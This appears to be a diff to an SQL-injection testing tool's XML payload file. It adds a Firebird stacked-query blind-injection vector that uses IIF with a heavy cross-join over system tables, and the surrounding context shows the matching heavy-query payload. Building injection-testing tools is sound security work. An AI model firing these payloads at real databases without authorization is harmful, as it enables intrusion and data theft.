@@ -1431,7 +1431,7 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector></vector>
+        <vector>; SELECT IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1, RDB$TYPES AS T2, RDB$COLLATIONS AS T3),[RANDNUM]) FROM RDB$DATABASE;</vector>
         <request>
             <payload>; SELECT COUNT(*) FROM RDB$FIELDS AS T1, RDB$TYPES AS T2, RDB$COLLATIONS AS T3;</payload>
             <comment>--</comment>
